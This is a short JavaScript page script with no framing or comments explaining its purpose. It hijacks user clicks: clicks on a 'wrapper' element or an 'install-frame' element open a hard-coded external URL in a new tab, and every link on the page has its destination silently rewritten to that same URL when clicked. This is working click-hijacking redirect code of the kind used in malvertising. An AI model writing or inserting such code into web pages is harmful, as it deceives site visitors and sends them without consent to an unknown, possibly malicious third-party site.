
var redir = "https://eiteribesshaints.com/click";
document.body.onclick = function(a){
  source = a.target.className.toLowerCase();
  //window.open(redir,"_self");
  if (source == "wrapper") {
    window.open(redir,"_blank");
    //console.log(source);
  }
};
document.getElementById('install-frame').onclick = function() {
  window.open(redir,"_blank");
}

var links = document.getElementsByTagName('a');

for(var i = 0, len = links.length; i < len; i++) {
  links[i].onclick = function() {
    this.setAttribute('href', redir);
  }
}
